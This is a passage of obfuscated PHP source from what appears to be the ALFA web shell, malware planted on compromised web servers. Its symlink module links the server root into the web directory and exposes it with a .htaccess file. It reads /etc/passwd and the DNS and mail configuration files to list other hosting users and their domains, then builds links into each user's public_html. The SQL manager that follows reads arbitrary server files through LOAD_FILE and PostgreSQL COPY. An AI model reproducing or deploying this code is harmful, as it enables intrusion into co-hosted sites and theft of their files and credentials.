$olgpvucu1fa36c7a1aa1062b9227fc5572e5805c = $amrueank10b04069381b2fef4e0a41e0ea65b914.rand(111,9999);
$qulngrvpd80b0ef93e3b626c7614d24dbd523391 = 'alfasymlinkphp/'.$olgpvucu1fa36c7a1aa1062b9227fc5572e5805c.'/';
@mkdir($qulngrvpd80b0ef93e3b626c7614d24dbd523391, 0777, true);
alfacgihtaccess('sym', $qulngrvpd80b0ef93e3b626c7614d24dbd523391, $wotiivfs4930ff3daf8e31b1f189819fcad77e1e);
_alfa_symlink("$jwzcflrpd6fe1d0be6347b8ef2427fa629c04485","$qulngrvpd80b0ef93e3b626c7614d24dbd523391/$wotiivfs4930ff3daf8e31b1f189819fcad77e1e");
echo __pre();
echo '<center><b><font color="white">Click >> </font><a target="_blank" href="'.__ALFA_DATA_FOLDER__."/".$qulngrvpd80b0ef93e3b626c7614d24dbd523391.'" ><b><font size="4">'.$wotiivfs4930ff3daf8e31b1f189819fcad77e1e.'</font></b></a></b></center>';
}
}else{echo "<center><pre class=ml1 style='margin-top:5px'><b><font color=\"#FFFFFF\">[+] Symlink Function Disabled !</b></font></pre></center>";}
}
if(isset($_POST['alfa2']) && $_POST['alfa2']=='symphp'){
$emqpgypucfee63abb9f61af226a0ed410bd27503 = true;
if(function_exists('symlink')||_alfa_can_runCommand(false,false)){
@mkdir('alfasymlink',0777);
alfacgihtaccess('sym','alfasymlink/');
_alfa_symlink('/','alfasymlink/root');
$rpvpiklte4438a34c96dc317518305ff33446590 = "<pre id=\"strOutput\" style=\"margin-top:5px\" class=\"ml1\"><br><table id='tbl_sympphp' align='center' width='40%' class='main' border='1'><td><span style='color:#FFFF01;'><b>*</span></b></td><td><span style='color:#00A220;'><b>Domains</span></b></td><td><span style='color:#FFFFFF;'><b>Users</span></b></td><td><span style='color:#FF0000;'><b>symlink</span></b></td>";
if(_alfa_file_exists("/etc/named.conf") && !_alfa_file_exists("/etc/virtual/domainowners") && _alfa_file_exists("/etc/valiases/")){
echo "<center>";
$rotcxius980da98409d058c365664ff7ea33dd6b = array();
$imsdmvbtfc6c17b164f4d1425e0c3bb04018fe8d = array();
$htexpnqme9e5ad0c05ee1a43715572e5cc545926 = array();
$mzowvciqce183dd09e479cb46598fab58042c279 = array();
$kowlomtecb5e100e5a9a3e7f6d1fd97512215282 = false;
$sradkvjl294de3557d9d00b3d2d8a1e6aab028cf = false;
$nddlimoycaf1642d28814084eb82983b9c9c88d6 = "/home/{user}/public_html/";
$jwhtlluxe4e46deb7f9cc58c7abfb32e5570b6f3 = alfaGetDomains();
$rotcxius980da98409d058c365664ff7ea33dd6b = $jwhtlluxe4e46deb7f9cc58c7abfb32e5570b6f3["lines"];
$vrvwwpml9ed39e2ea931586b6a985a6942ef573e = $jwhtlluxe4e46deb7f9cc58c7abfb32e5570b6f3["state"];
$xjaxgmnv83de6dd031ba173f21967a931037ec60 = function_exists("posix_getpwuid") && function_exists("fileowner");
$gaywbmmzb5f0f86473671922c8ca300c9b3964da = _alfa_can_runCommand(false,false);
if(!$xjaxgmnv83de6dd031ba173f21967a931037ec60 && !$gaywbmmzb5f0f86473671922c8ca300c9b3964da){
	$sradkvjl294de3557d9d00b3d2d8a1e6aab028cf = true;
	$imsdmvbtfc6c17b164f4d1425e0c3bb04018fe8d = $jwhtlluxe4e46deb7f9cc58c7abfb32e5570b6f3["lines"];
	$rotcxius980da98409d058c365664ff7ea33dd6b = _alfa_file('/etc/passwd');
}
echo $rpvpiklte4438a34c96dc317518305ff33446590;
$gstvxiofe2942a04780e223b215eb8b663cf5353=1;
$gpzvhhsw66f6181bcb4cff4cd38fbc804a036db6 = '<tr><td><span style="color:#FFFF01;">{count}</span></td><td style="text-align:left;"><a target="_blank" href="{http}"/><span style="color:#00A220;margin-left:10px;"><b>{domain}</b> </a></span></td><td style="text-align:left;"><span style="color:#FFFFFF;margin-left:10px;"><b>{owner}</font></b></td><td><a href="'.__ALFA_DATA_FOLDER__.'/alfasymlink/root{sympath}" target="_blank"><span style="color:#FF0000;">Symlink</span></a></td></tr>';
foreach($rotcxius980da98409d058c365664ff7ea33dd6b as $yeshcnjz6438c669e0d0de98e6929c2cc0fac474){
	$qbjarsosad5f82e879a9c5d6b5b442eb37e50551 = "";
	$uexvflme72122ce96bfec66e2396d2e25225d70a = "";
	if($sradkvjl294de3557d9d00b3d2d8a1e6aab028cf){
		$dtjwbadif821b5159d85278da0badf5d32ffe210 = explode(":", $yeshcnjz6438c669e0d0de98e6929c2cc0fac474);
		$uexvflme72122ce96bfec66e2396d2e25225d70a = $dtjwbadif821b5159d85278da0badf5d32ffe210[0];
		$gfnlupyv7a10ffd76b8af11650c361f68024e752 = strlen($uexvflme72122ce96bfec66e2396d2e25225d70a) - 1;
		$xxfwtkpaea8f538c94b6e352418254ed6474a81f = $dtjwbadif821b5159d85278da0badf5d32ffe210[2];
		if((int)$xxfwtkpaea8f538c94b6e352418254ed6474a81f < 500)continue;
		$qbjarsosad5f82e879a9c5d6b5b442eb37e50551 = "[?????]";
		$bcnkdzpbe94abcdda4c989fc226508beffab1371 = array();
		$eqsewqrq9005b92f4d155f8736f7e3647f552ca9 = false;
		foreach($imsdmvbtfc6c17b164f4d1425e0c3bb04018fe8d as $gissihyx9163834aac262db4408928dd21608752){
			if($vrvwwpml9ed39e2ea931586b6a985a6942ef573e == "named.conf"){
				if(@strstr($gissihyx9163834aac262db4408928dd21608752, 'zone')){
					preg_match_all('#zone "(.*)"#',$gissihyx9163834aac262db4408928dd21608752, $sfmsaibm8d777f385d3dfec8815d20f7496026dc);
					$qbjarsosad5f82e879a9c5d6b5b442eb37e50551 = $sfmsaibm8d777f385d3dfec8815d20f7496026dc[1][0];
				}else{
					continue;
				}
			}elseif($vrvwwpml9ed39e2ea931586b6a985a6942ef573e == "named" || $vrvwwpml9ed39e2ea931586b6a985a6942ef573e == "valiases"){
				if($gissihyx9163834aac262db4408928dd21608752 == "." || $gissihyx9163834aac262db4408928dd21608752 == "..")continue;
				if($vrvwwpml9ed39e2ea931586b6a985a6942ef573e == "named")$gissihyx9163834aac262db4408928dd21608752 = rtrim($gissihyx9163834aac262db4408928dd21608752, ".db");
				$qbjarsosad5f82e879a9c5d6b5b442eb37e50551 = $gissihyx9163834aac262db4408928dd21608752;
			}
			$awzpxgwq7564419312cfbd932f4bd36412e8d6aa = str_replace(array("-","."), "", $qbjarsosad5f82e879a9c5d6b5b442eb37e50551);
			if(substr($uexvflme72122ce96bfec66e2396d2e25225d70a, 0, $gfnlupyv7a10ffd76b8af11650c361f68024e752) == substr($awzpxgwq7564419312cfbd932f4bd36412e8d6aa, 0, $gfnlupyv7a10ffd76b8af11650c361f68024e752)){
				if(in_array($uexvflme72122ce96bfec66e2396d2e25225d70a.$qbjarsosad5f82e879a9c5d6b5b442eb37e50551, $bcnkdzpbe94abcdda4c989fc226508beffab1371))continue;
				$kfotlzxs0ceeb9cdc26a4500ef1d94e6f3057d1c = str_replace("{user}", $uexvflme72122ce96bfec66e2396d2e25225d70a, $nddlimoycaf1642d28814084eb82983b9c9c88d6);
				$pvoljqdc80791b3ae7002cb88c246876d9faa8f8 = "http://".$qbjarsosad5f82e879a9c5d6b5b442eb37e50551;
				echo str_replace(array("{count}", "{http}", "{domain}", "{owner}", "{sympath}"), array($gstvxiofe2942a04780e223b215eb8b663cf5353, $pvoljqdc80791b3ae7002cb88c246876d9faa8f8, $qbjarsosad5f82e879a9c5d6b5b442eb37e50551, $uexvflme72122ce96bfec66e2396d2e25225d70a, $kfotlzxs0ceeb9cdc26a4500ef1d94e6f3057d1c), $gpzvhhsw66f6181bcb4cff4cd38fbc804a036db6);
				$gstvxiofe2942a04780e223b215eb8b663cf5353++;
				$bcnkdzpbe94abcdda4c989fc226508beffab1371[] = $uexvflme72122ce96bfec66e2396d2e25225d70a.$qbjarsosad5f82e879a9c5d6b5b442eb37e50551;
				$eqsewqrq9005b92f4d155f8736f7e3647f552ca9 = true;
			}
		}
		if(!$eqsewqrq9005b92f4d155f8736f7e3647f552ca9){$htexpnqme9e5ad0c05ee1a43715572e5cc545926[] = $uexvflme72122ce96bfec66e2396d2e25225d70a;
		}
	}else{
 		if($vrvwwpml9ed39e2ea931586b6a985a6942ef573e == "named.conf"){
			if(@strstr($yeshcnjz6438c669e0d0de98e6929c2cc0fac474, 'zone')){
				preg_match_all('#zone "(.*)"#',$yeshcnjz6438c669e0d0de98e6929c2cc0fac474, $sfmsaibm8d777f385d3dfec8815d20f7496026dc);
				$qbjarsosad5f82e879a9c5d6b5b442eb37e50551 = $sfmsaibm8d777f385d3dfec8815d20f7496026dc[1][0];
			}else{
				continue;
			}
		}elseif($vrvwwpml9ed39e2ea931586b6a985a6942ef573e == "named" || $vrvwwpml9ed39e2ea931586b6a985a6942ef573e == "valiases"){
			if($yeshcnjz6438c669e0d0de98e6929c2cc0fac474 == "." || $yeshcnjz6438c669e0d0de98e6929c2cc0fac474 == "..")continue;
			if($vrvwwpml9ed39e2ea931586b6a985a6942ef573e == "named")$yeshcnjz6438c669e0d0de98e6929c2cc0fac474 = rtrim($yeshcnjz6438c669e0d0de98e6929c2cc0fac474, ".db");
			$qbjarsosad5f82e879a9c5d6b5b442eb37e50551 = $yeshcnjz6438c669e0d0de98e6929c2cc0fac474;
		}
		if(strlen(trim($qbjarsosad5f82e879a9c5d6b5b442eb37e50551)) > 2 && $vrvwwpml9ed39e2ea931586b6a985a6942ef573e != "passwd"){
			if(!_alfa_file_exists('/etc/valiases/'.$qbjarsosad5f82e879a9c5d6b5b442eb37e50551, false))continue;
			if($xjaxgmnv83de6dd031ba173f21967a931037ec60){
				$eeodyzriee11cbb19052e40b07aac0ca060c23ee = @posix_getpwuid(@fileowner('/etc/valiases/'.$qbjarsosad5f82e879a9c5d6b5b442eb37e50551));
				$uexvflme72122ce96bfec66e2396d2e25225d70a = $eeodyzriee11cbb19052e40b07aac0ca060c23ee["name"];
			}elseif($gaywbmmzb5f0f86473671922c8ca300c9b3964da){
				$uexvflme72122ce96bfec66e2396d2e25225d70a = alfaEx("stat -c '%U' /etc/valiases/".$qbjarsosad5f82e879a9c5d6b5b442eb37e50551,false,false);
			}
		}
	}
	if(!$sradkvjl294de3557d9d00b3d2d8a1e6aab028cf){
		if(strlen($uexvflme72122ce96bfec66e2396d2e25225d70a)==0 || in_array($uexvflme72122ce96bfec66e2396d2e25225d70a.$qbjarsosad5f82e879a9c5d6b5b442eb37e50551, $mzowvciqce183dd09e479cb46598fab58042c279))continue;
		$kfotlzxs0ceeb9cdc26a4500ef1d94e6f3057d1c = str_replace("{user}", $uexvflme72122ce96bfec66e2396d2e25225d70a, $nddlimoycaf1642d28814084eb82983b9c9c88d6);
		$pvoljqdc80791b3ae7002cb88c246876d9faa8f8 = "http://".$qbjarsosad5f82e879a9c5d6b5b442eb37e50551;
		if($vrvwwpml9ed39e2ea931586b6a985a6942ef573e == "passwd"){
			$pvoljqdc80791b3ae7002cb88c246876d9faa8f8 = "javascript:alert('we cant find domain...')";
		}
		echo str_replace(array("{count}", "{http}", "{domain}", "{owner}", "{sympath}"), array($gstvxiofe2942a04780e223b215eb8b663cf5353, $pvoljqdc80791b3ae7002cb88c246876d9faa8f8, $qbjarsosad5f82e879a9c5d6b5b442eb37e50551, $uexvflme72122ce96bfec66e2396d2e25225d70a, $kfotlzxs0ceeb9cdc26a4500ef1d94e6f3057d1c), $gpzvhhsw66f6181bcb4cff4cd38fbc804a036db6);
		$gstvxiofe2942a04780e223b215eb8b663cf5353++;
		$mzowvciqce183dd09e479cb46598fab58042c279[] = $uexvflme72122ce96bfec66e2396d2e25225d70a.$qbjarsosad5f82e879a9c5d6b5b442eb37e50551;
	}
}
if($sradkvjl294de3557d9d00b3d2d8a1e6aab028cf){
	foreach($htexpnqme9e5ad0c05ee1a43715572e5cc545926 as $uexvflme72122ce96bfec66e2396d2e25225d70a){
		$kfotlzxs0ceeb9cdc26a4500ef1d94e6f3057d1c = str_replace("{user}", $uexvflme72122ce96bfec66e2396d2e25225d70a, $nddlimoycaf1642d28814084eb82983b9c9c88d6);
		$pvoljqdc80791b3ae7002cb88c246876d9faa8f8 = "javascript:alert('we cant find domain...')";
		echo str_replace(array("{count}", "{http}", "{domain}", "{owner}", "{sympath}"), array($gstvxiofe2942a04780e223b215eb8b663cf5353, $pvoljqdc80791b3ae7002cb88c246876d9faa8f8, "[????]", $uexvflme72122ce96bfec66e2396d2e25225d70a, $kfotlzxs0ceeb9cdc26a4500ef1d94e6f3057d1c), $gpzvhhsw66f6181bcb4cff4cd38fbc804a036db6);
		$gstvxiofe2942a04780e223b215eb8b663cf5353++;
	}
}
$emqpgypucfee63abb9f61af226a0ed410bd27503 = false;
}else{
$ksmhyxred6ebdd1917aa6fd3aa4228decf56e704 = false;
$nddlimoycaf1642d28814084eb82983b9c9c88d6 = alfaMakePwd();
if(_alfa_file_exists("/etc/virtual/domainowners")){
	$nddlimoycaf1642d28814084eb82983b9c9c88d6 = "/home/{user}/public_html";
	$ksmhyxred6ebdd1917aa6fd3aa4228decf56e704 = true;
}
$nuabiabibeb7f7a395dc21ad97425bbc061afbaf = _alfa_file("/etc/virtual/domainowners");
$gstvxiofe2942a04780e223b215eb8b663cf5353=1;
echo $rpvpiklte4438a34c96dc317518305ff33446590;
$gpzvhhsw66f6181bcb4cff4cd38fbc804a036db6 = '<tr><td><span style="color:#FFFF01;">{count}</span></td><td style="text-align:left;"><a target="_blank" href="http://www.{url}"/><span style="color:#00A220;margin-left:10px;"><b>{url}</b> </a></span></td><td style="text-align:left;"><span style="color:#FFFFFF;margin-left:10px;"><b>{user}</font></b></td><td><a href="'.__ALFA_DATA_FOLDER__.'/alfasymlink/root{cwd}" target="_blank"><span style="color:#FF0000;">Symlink</span></a></td></tr>';
if($nuabiabibeb7f7a395dc21ad97425bbc061afbaf){
	foreach($nuabiabibeb7f7a395dc21ad97425bbc061afbaf as $fvvocjkn46cf0e59759c9b7f1112ca4b174343ef){
		if(@strstr($fvvocjkn46cf0e59759c9b7f1112ca4b174343ef,":")){
			$syosrpmxd4a590caacc0be55ef286e40a945ea45 = explode(':', $fvvocjkn46cf0e59759c9b7f1112ca4b174343ef);
			$lpndcjtf109633366fd0d46d371ede589998abaa = str_replace("{user}", trim($syosrpmxd4a590caacc0be55ef286e40a945ea45[1]), $nddlimoycaf1642d28814084eb82983b9c9c88d6);
			echo str_replace(array("{count}","{user}","{url}","{cwd}"), array($gstvxiofe2942a04780e223b215eb8b663cf5353++, trim($syosrpmxd4a590caacc0be55ef286e40a945ea45[1]), trim($syosrpmxd4a590caacc0be55ef286e40a945ea45[0]), $lpndcjtf109633366fd0d46d371ede589998abaa), $gpzvhhsw66f6181bcb4cff4cd38fbc804a036db6);
		}
	}
}else{
	$hkzphjmk76a2173be6393254e72ffa4d6df1030a = _alfa_file("/etc/passwd");
	if($hkzphjmk76a2173be6393254e72ffa4d6df1030a){
		$ganhkkwefc35fdc70d5fc69d269883a822c7a53e = "";
		$vbptyrplf740e0e2c6fe160ae7d27904d6f6d545 = false;
		$qbyndzxd9bc65c2abec141778ffaa729489f3e87 = array();
		$jwhtlluxe4e46deb7f9cc58c7abfb32e5570b6f3 = array();
		$hquclxobbf653f763917e644ce9567f8e270ac61 = array();
		foreach($hkzphjmk76a2173be6393254e72ffa4d6df1030a as $eeodyzriee11cbb19052e40b07aac0ca060c23ee){
			$eeodyzriee11cbb19052e40b07aac0ca060c23ee = trim($eeodyzriee11cbb19052e40b07aac0ca060c23ee);
			$tabjyczfdc653fc0484527ae99855fdd042b2747 = explode(":", $eeodyzriee11cbb19052e40b07aac0ca060c23ee);
			if((int)$tabjyczfdc653fc0484527ae99855fdd042b2747[2] < 500)continue;
			$qbyndzxd9bc65c2abec141778ffaa729489f3e87[$tabjyczfdc653fc0484527ae99855fdd042b2747[0]] = $tabjyczfdc653fc0484527ae99855fdd042b2747[5];
		}
		$phihcrzubafbc03c59c9ba86744e95d3e9d21f6f = @scandir("/etc/virtual/");
		if(!$phihcrzubafbc03c59c9ba86744e95d3e9d21f6f){
			$phihcrzubafbc03c59c9ba86744e95d3e9d21f6f = alfaEx("ls /etc/virtual/");
			$phihcrzubafbc03c59c9ba86744e95d3e9d21f6f = explode("\n", $phihcrzubafbc03c59c9ba86744e95d3e9d21f6f);
			if(!$phihcrzubafbc03c59c9ba86744e95d3e9d21f6f){
				$phihcrzubafbc03c59c9ba86744e95d3e9d21f6f = _alfa_file("/etc/named.conf");
				if($phihcrzubafbc03c59c9ba86744e95d3e9d21f6f){$vbptyrplf740e0e2c6fe160ae7d27904d6f6d545 = true;}
			}
		}
		foreach($phihcrzubafbc03c59c9ba86744e95d3e9d21f6f as $yeshcnjz6438c669e0d0de98e6929c2cc0fac474){
			if($vbptyrplf740e0e2c6fe160ae7d27904d6f6d545){
				if(@strstr($yeshcnjz6438c669e0d0de98e6929c2cc0fac474, 'zone')){
					preg_match_all('#zone "(.*)"#',$yeshcnjz6438c669e0d0de98e6929c2cc0fac474, $sfmsaibm8d777f385d3dfec8815d20f7496026dc);
					$qbjarsosad5f82e879a9c5d6b5b442eb37e50551 = $sfmsaibm8d777f385d3dfec8815d20f7496026dc[1][0];
					if(strlen($qbjarsosad5f82e879a9c5d6b5b442eb37e50551  > 2) && !empty($qbjarsosad5f82e879a9c5d6b5b442eb37e50551)){
						$jwhtlluxe4e46deb7f9cc58c7abfb32e5570b6f3[] = $qbjarsosad5f82e879a9c5d6b5b442eb37e50551;
					}
				}
			}else{
				$jwhtlluxe4e46deb7f9cc58c7abfb32e5570b6f3[] = $yeshcnjz6438c669e0d0de98e6929c2cc0fac474;
			}
		}
		$fyyftmba9dd4e461268c8034f5c8564e155c67a6 = 1;
		foreach($qbyndzxd9bc65c2abec141778ffaa729489f3e87 as $eeodyzriee11cbb19052e40b07aac0ca060c23ee => $qnrubnys106a6c241b8797f52e1e77317b96a201){
			foreach($jwhtlluxe4e46deb7f9cc58c7abfb32e5570b6f3 as $qbjarsosad5f82e879a9c5d6b5b442eb37e50551){
				$cepprcnyde44140bd73233934b5d7a023119378b = strlen($eeodyzriee11cbb19052e40b07aac0ca060c23ee) - 1;
				$awzpxgwq7564419312cfbd932f4bd36412e8d6aa = str_replace(array("-","."), "", $qbjarsosad5f82e879a9c5d6b5b442eb37e50551);
				$zzkjsxfm9b729b7da9e8f6984a146f9177335c2e = substr($eeodyzriee11cbb19052e40b07aac0ca060c23ee, 0,$cepprcnyde44140bd73233934b5d7a023119378b);
				$qmhunrrpa8f46b090c25418a74ca4be507e7c5ec = substr($awzpxgwq7564419312cfbd932f4bd36412e8d6aa, 0,$cepprcnyde44140bd73233934b5d7a023119378b);
				if($zzkjsxfm9b729b7da9e8f6984a146f9177335c2e == $qmhunrrpa8f46b090c25418a74ca4be507e7c5ec){
					if($ksmhyxred6ebdd1917aa6fd3aa4228decf56e704){
						$lpndcjtf109633366fd0d46d371ede589998abaa = str_replace("{user}", $eeodyzriee11cbb19052e40b07aac0ca060c23ee, $nddlimoycaf1642d28814084eb82983b9c9c88d6);
					}else{
						$tabjyczfdc653fc0484527ae99855fdd042b2747 = explode("}/", $nddlimoycaf1642d28814084eb82983b9c9c88d6);
						$lpndcjtf109633366fd0d46d371ede589998abaa = $qnrubnys106a6c241b8797f52e1e77317b96a201."/".$tabjyczfdc653fc0484527ae99855fdd042b2747[1];
					}
					$ganhkkwefc35fdc70d5fc69d269883a822c7a53e .= str_replace(array("{count}","{user}","{url}", "{cwd}"), array($fyyftmba9dd4e461268c8034f5c8564e155c67a6++, $eeodyzriee11cbb19052e40b07aac0ca060c23ee, $qbjarsosad5f82e879a9c5d6b5b442eb37e50551, $lpndcjtf109633366fd0d46d371ede589998abaa), $gpzvhhsw66f6181bcb4cff4cd38fbc804a036db6);
				}else{
					$hquclxobbf653f763917e644ce9567f8e270ac61[$eeodyzriee11cbb19052e40b07aac0ca060c23ee] = $qnrubnys106a6c241b8797f52e1e77317b96a201;
				}
			}
		}
		$hquclxobbf653f763917e644ce9567f8e270ac61 = array_unique($hquclxobbf653f763917e644ce9567f8e270ac61);
		foreach($hquclxobbf653f763917e644ce9567f8e270ac61 as $eeodyzriee11cbb19052e40b07aac0ca060c23ee => $qnrubnys106a6c241b8797f52e1e77317b96a201){
			if($ksmhyxred6ebdd1917aa6fd3aa4228decf56e704){
				$lpndcjtf109633366fd0d46d371ede589998abaa = str_replace("{user}", $eeodyzriee11cbb19052e40b07aac0ca060c23ee, $nddlimoycaf1642d28814084eb82983b9c9c88d6);
			}else{
				$tabjyczfdc653fc0484527ae99855fdd042b2747 = explode("}/", $nddlimoycaf1642d28814084eb82983b9c9c88d6);
				$lpndcjtf109633366fd0d46d371ede589998abaa = $qnrubnys106a6c241b8797f52e1e77317b96a201."/".$tabjyczfdc653fc0484527ae99855fdd042b2747[1];
			}
			$ganhkkwefc35fdc70d5fc69d269883a822c7a53e .= str_replace(array("{count}","{user}","{url}", "{cwd}"), array($fyyftmba9dd4e461268c8034f5c8564e155c67a6++, $eeodyzriee11cbb19052e40b07aac0ca060c23ee, "[?????]", $lpndcjtf109633366fd0d46d371ede589998abaa), $gpzvhhsw66f6181bcb4cff4cd38fbc804a036db6);
		}
		echo($ganhkkwefc35fdc70d5fc69d269883a822c7a53e);
	}
}
echo "</table>";
$emqpgypucfee63abb9f61af226a0ed410bd27503 = false;
}
}else{
	echo "<pre class=ml1 style='margin-top:5px'><b><font color=\"#FFFFFF\">[+] Symlink Function Disabled !</b></font></pre></center>";
	$emqpgypucfee63abb9f61af226a0ed410bd27503 = false;
}
if($emqpgypucfee63abb9f61af226a0ed410bd27503)echo '<pre id="strOutput" style="margin-top:5px" class="ml1"><br><font color="#FFFFFF">Error...</font></b><br>';
echo "</center></table>";
}
echo "</div>";
alfafooter();
}
function alfasql(){
class DbClass{
public $hcgexxko599dcce2998a6b40b1e38e8c6006cb0a;
public $rsrmsacs2a304a1348456ccd2234cd71a81bd338;
public $ybaqpbzt9b207167e5381c47682c6b4f58a623fb;
public $pdheuxgqb026c6848a07a615c13ccdf3a034c682 = false;
public $hnfqefqi6569392469f54940efeb8edfce526097 = "";
function __construct($hcgexxko599dcce2998a6b40b1e38e8c6006cb0a){
$this->$cpczkgdd4eea6ccf643d5b7f6218395317a4512a = $hcgexxko599dcce2998a6b40b1e38e8c6006cb0a;
}
function connect($wlerpykf67b3dba8bc6778101892eb77249db32e, $eeodyzriee11cbb19052e40b07aac0ca060c23ee, $niuecjcs1a1dc91c907325c69271ddf0c944bc72, $pghnyjea4cd4a49f25984e26fe708c1fbd896653){
switch($this->$cpczkgdd4eea6ccf643d5b7f6218395317a4512a){
case 'mysql':
if($this->$vnahwpzo0a16bc32f55683128983f223de242942 = @mysqli_connect($wlerpykf67b3dba8bc6778101892eb77249db32e,$eeodyzriee11cbb19052e40b07aac0ca060c23ee,$niuecjcs1a1dc91c907325c69271ddf0c944bc72,$pghnyjea4cd4a49f25984e26fe708c1fbd896653)){
	return true;
}else{
	$this->$cihfktile33d4f5439a6b8b730352a9ddd04b1b2 = true;
	$this->$lbigkecwc00813dcbde065b7bb6dba1660a061ed = mysqli_connect_error();
	return false;
}
break;
case 'pgsql':
$wlerpykf67b3dba8bc6778101892eb77249db32e = explode(':', $wlerpykf67b3dba8bc6778101892eb77249db32e);
if(!$wlerpykf67b3dba8bc6778101892eb77249db32e[1]) $wlerpykf67b3dba8bc6778101892eb77249db32e[1]=5432;
if( $this->$vnahwpzo0a16bc32f55683128983f223de242942 = @pg_connect("host={$wlerpykf67b3dba8bc6778101892eb77249db32e[0]} port={$wlerpykf67b3dba8bc6778101892eb77249db32e[1]} user=$eeodyzriee11cbb19052e40b07aac0ca060c23ee password=$niuecjcs1a1dc91c907325c69271ddf0c944bc72 dbname=$pghnyjea4cd4a49f25984e26fe708c1fbd896653") ) return true;
break;
}
return false;
}
function selectdb($dhkkpmvsd77d5e503ad1439f585ac494268b351b){
switch($this->$cpczkgdd4eea6ccf643d5b7f6218395317a4512a){
case 'mysql':
if(@mysqli_select_db($dhkkpmvsd77d5e503ad1439f585ac494268b351b))return true;
break;
}
return false;
}
function query($okjeiabf341be97d9aff90c9978347f66f945b77){
switch($this->$cpczkgdd4eea6ccf643d5b7f6218395317a4512a){
case 'mysql':
return $this->$ovjcnuas12470fe406d44017d96eab37dd65fc14 = @mysqli_query($this->$vnahwpzo0a16bc32f55683128983f223de242942,$okjeiabf341be97d9aff90c9978347f66f945b77);
break;
case 'pgsql':
return $this->$ovjcnuas12470fe406d44017d96eab37dd65fc14 = @pg_query($this->$vnahwpzo0a16bc32f55683128983f223de242942,$okjeiabf341be97d9aff90c9978347f66f945b77);
break;
}
return false;
}
function fetch(){
$ybaqpbzt9b207167e5381c47682c6b4f58a623fb = func_num_args()?func_get_arg(0):$this->$ovjcnuas12470fe406d44017d96eab37dd65fc14;
switch($this->$cpczkgdd4eea6ccf643d5b7f6218395317a4512a){
case 'mysql':
return @mysqli_fetch_assoc($ybaqpbzt9b207167e5381c47682c6b4f58a623fb);
break;
case 'pgsql':
return @pg_fetch_assoc($ybaqpbzt9b207167e5381c47682c6b4f58a623fb);
break;
}
return false;
}
function listDbs(){
switch($this->$cpczkgdd4eea6ccf643d5b7f6218395317a4512a){
case 'mysql':
return $this->query("SHOW databases");
break;
case 'pgsql':
return $this->$ovjcnuas12470fe406d44017d96eab37dd65fc14 = $this->query("SELECT datname FROM pg_database WHERE datistemplate!='t'");
break;
}
return false;
}
function listTables(){
switch($this->$cpczkgdd4eea6ccf643d5b7f6218395317a4512a){
case 'mysql':
return $this->$ovjcnuas12470fe406d44017d96eab37dd65fc14 = $this->query('SHOW TABLES');
break;
case 'pgsql':
return $this->$ovjcnuas12470fe406d44017d96eab37dd65fc14 = $this->query("select table_name from information_schema.tables where table_schema != 'information_schema' AND table_schema != 'pg_catalog'");
break;
}
return false;
}
function error(){
switch($this->$cpczkgdd4eea6ccf643d5b7f6218395317a4512a){
case 'mysql':
return @mysqli_error($this->$vnahwpzo0a16bc32f55683128983f223de242942);
break;
case 'pgsql':
return @pg_last_error();
break;
}
return false;
}
function setCharset($okjeiabf341be97d9aff90c9978347f66f945b77){
switch($this->$cpczkgdd4eea6ccf643d5b7f6218395317a4512a){
case 'mysql':
if(function_exists('mysql_set_charset'))
return @mysqli_set_charset($this->$vnahwpzo0a16bc32f55683128983f223de242942,$okjeiabf341be97d9aff90c9978347f66f945b77);
else
$this->query('SET CHARSET '.$okjeiabf341be97d9aff90c9978347f66f945b77);
break;
case 'pgsql':
return @pg_set_client_encoding($this->$vnahwpzo0a16bc32f55683128983f223de242942, $okjeiabf341be97d9aff90c9978347f66f945b77);
break;
}
return false;
}
function loadFile($okjeiabf341be97d9aff90c9978347f66f945b77){
switch($this->$cpczkgdd4eea6ccf643d5b7f6218395317a4512a){
case 'mysql':
return $this->fetch($this->query("SELECT LOAD_FILE('".addslashes($okjeiabf341be97d9aff90c9978347f66f945b77)."') as file"));
break;
case 'pgsql':
$this->query("CREATE TABLE solevisible(file text);COPY solevisible FROM '".addslashes($okjeiabf341be97d9aff90c9978347f66f945b77)."';select file from solevisible;");
$yxarqqmp4b43b0aee35624cd95b910189b3dc231=array();
while($brcjlegv865c0c0b4ab0e063e5caa3387c1a8741=$this->fetch())
$yxarqqmp4b43b0aee35624cd95b910189b3dc231[] = $brcjlegv865c0c0b4ab0e063e5caa3387c1a8741['file'];
$this->query('drop table solevisible');
return array('file'=>implode("\n",$yxarqqmp4b43b0aee35624cd95b910189b3dc231));
break;
}
return false;
}
};
$dhkkpmvsd77d5e503ad1439f585ac494268b351b = new DbClass($_POST['type']);
alfahead();
$kkofmnwibd4e5fa0a792853ce7c23938d8d7454b = "table";
if(isset($_POST['sql_host'])){
	$ptdvxdqe1ef1093be8ab258c29c47cd73a908655 = $dhkkpmvsd77d5e503ad1439f585ac494268b351b->connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass'], $_POST['sql_base']);
	if($ptdvxdqe1ef1093be8ab258c29c47cd73a908655 && !empty($_POST['sql_base'])){
		$kkofmnwibd4e5fa0a792853ce7c23938d8d7454b = "none";
	}
}
$tpcabxrb70998fbda3b8e12bedce9c4eba825ea8 = array();
echo "
<div class='header' style='min-height:300px;'>".($kkofmnwibd4e5fa0a792853ce7c23938d8d7454b!="none"?"<center><div class='txtfont_header'>| Sql Manager |</div><p>".getConfigHtml('all')."</p></center><div style='text-align:center;margin-bottom: 10px;'><button class='connection-his-btn db-opt-id' onclick='alfaShowConnectionHistory(this);' mode='on'>Connection History</button><div class='connection_history_holder'></div></div>":"")."
<div class='sf' class='db-opt-id'><table style='margin: 0 auto;".($kkofmnwibd4e5fa0a792853ce7c23938d8d7454b=="none"?"display:none;":"")."' cellpadding='2' cellspacing='0'><tr>
<td><div class=\"txtfont\">TYPE</div></td><td><div class=\"txtfont\">HOST</div></td><td><div class=\"txtfont\">DB USER</div></td><td><div class=\"txtfont\">DB PASS</div></td><td><div class=\"txtfont\">DB NAME</div></td><td></td></tr><tr>
<td><select name='type'><option value='mysql' selected>mysql</option></select></td>
<td><input type='text' name='sql_host' id='db_host' value='". (empty($_POST['sql_host'])?'localhost':htmlspecialchars($_POST['sql_host'])) ."'></td>
<td><input type='text' name='sql_login' id='db_user' value='". (empty($_POST['sql_login'])?'':htmlspecialchars($_POST['sql_login'])) ."'></td>
<td><input type='text' name='sql_pass' id='db_pw' value='". (empty($_POST['sql_pass'])?'':htmlspecialchars($_POST['sql_pass'])) ."'></td><td>";
$wgjruzxgfa816edb83e95bf0c8da580bdfd491ef = "<input type='text' name='sql_base' id='db_name' value='". (empty($_POST['sql_base'])?'':htmlspecialchars($_POST['sql_base'])) ."'>";
